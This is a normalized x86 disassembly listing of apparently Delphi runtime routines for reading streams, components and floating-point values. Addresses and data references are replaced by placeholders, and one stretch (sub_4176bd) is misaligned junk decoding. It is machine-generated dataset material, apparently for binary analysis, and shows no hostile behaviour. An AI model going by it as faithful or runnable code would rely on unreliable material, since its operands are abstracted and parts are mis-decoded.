xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416968
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_416038
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413840
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_404004
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_416114
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413840
call sub_4167a8
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413840
mov edx eax
mov eax [ rw-data ]
call sub_413b24
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_413934
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_416944
push ebx
mov ebx eax
mov eax ebx
call sub_416a38
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_4154a0
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_416968
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403234
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_413840
call sub_403234
inc edi
dec esi
jne r-xdata
sub_4169a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_40317c
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_412ed4
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4031c0
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_412f4c
mov edi eax
mov edx [ esp + 0x4 ]
call sub_412e4c
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_403198
test al al
jne r-xdata
sub_416a74
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_416ac0
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_416ac0
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
sub_416b10
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418310
mov eax [ ebp - 0x4 ]
call sub_40422c
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416b62
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
call sub_41654c
sub_416b68
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41670c
test al al
jne r-xdata
mov eax ebx
call sub_41670c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_414060
jmp r-xdata
mov eax ebx
call sub_416a50
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_417678
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416c0f
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_414040
mov esi eax
mov eax ebx
call sub_417670
jmp r-xdata
mov eax ebx
call sub_4175c0
mov eax ebx
call sub_41670c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4177dc
mov eax ebx
call sub_417678
sub_416c38
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d34
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_4136e4
inc esi
dec ebx
jne r-xdata
sub_416c74
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_419804
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d34
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404ef0
add esp 0x4
mov edx ebx
mov eax edi
call sub_4197d8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d34
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_4197d8
test [ eax + 0x24 ] 0x4
je r-xdata
sub_416cec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404d34
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_416d54
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_416d74
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40274c
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_416d54
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_4187a4
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403234
sub_416dd4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_416eba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418944
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_416e8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_416ebf
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416d74
pop ecx
test al al
jne r-xdata
call sub_403a24
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039d0
sub_416ee4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_416f5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403430
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_41338c
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_416f61
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416d74
pop ecx
test al al
jne r-xdata
call sub_403a24
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039d0
sub_416f84
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_416fff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418944
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403430
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417004
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_416d74
pop ecx
test al al
jne r-xdata
call sub_403a24
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039d0
sub_417028
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_4182d4
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4182d4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_4171d7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_416c74
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_416cec
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_416dd4
pop ecx
push ebp
call sub_416f84
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_416ee4
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403a54
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_416cec
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_416cec
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417250
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_404efc
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403430
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41389c
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_416c38
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4136e4
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_416c38
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4136e4
sub_4171dc
push ebp
call sub_416d54
pop ecx
test al al
je r-xdata
call sub_4039d0
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403234
sub_417264
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4172d4
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4172d4
mov eax [ ebp - 0x4 ]
call sub_416824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416968
retn
sub_4172d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41670c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4177dc
mov eax [ ebp - 0x4 ]
call sub_417678
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403430
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403430
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41670c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_417028
mov eax [ ebp - 0x4 ]
call sub_417678
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41739d
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_4173a4
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_4184b0
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41762c
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_416a74
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_4173e8
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_4184b0
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41762c
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_416a74
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41742c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4184b0
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41762c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416a74
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41747c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4184b0
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41762c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416a74
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_4174c0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4184b0
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41654c
mov al [ eax + lookup_table_4174e7 ]
jmp [ eax * 4 + jump_table_4174f5 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_416a74
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40405c
mov eax esi
call j_sub_404438
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_416a74
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_4175c0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4184b0
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_416a74
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_416a74
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_416a74
jmp r-xdata
jmp r-xdata
call sub_41654c
sub_41762c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_416a50
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_4175c0
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_4184b0
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416a74
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_417680
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_416a50
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4184b0
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_4175c0
mov [ edi ] eax
sub_4176bd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403f6c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404004
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4177b8
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403184
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041d0
sub_4177dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_4037e8
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4182d4
xor edx edx
push ebp
push j_sub_4037e8#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_40422c
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_40448c
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40345c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410660
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40345c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410660
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_417b60
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_416a60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_416a60
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
